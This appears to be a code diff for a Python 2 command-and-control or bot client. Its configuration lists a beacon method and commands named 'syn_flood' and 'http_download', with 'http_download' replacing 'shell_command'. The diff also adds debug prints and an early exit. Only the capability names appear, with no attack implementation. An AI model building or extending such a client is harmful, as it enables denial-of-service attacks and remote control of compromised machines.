@@ -33,7 +33,7 @@ def load_config():
     # this is where the configuration file is parsed.
     #
     beacons = ['http_get']
-    commands = ['syn_flood','shell_command']
+    commands = ['syn_flood','http_download']
     decoders = ['json','base64']
     
     return (beacons,commands,decoders)
@@ -60,10 +60,14 @@ def start_beacon_loop(controller):
 
 def main():
     
+    print "starting..."
     beacons, commands, decoders = load_config()
     
+    print "Building controller..."
     controller = Controller(beacons, commands, decoders)
     
+    print "finished!"
+    exit()
     start_beacon_loop(controller)
 
 if __name__ == "__main__":
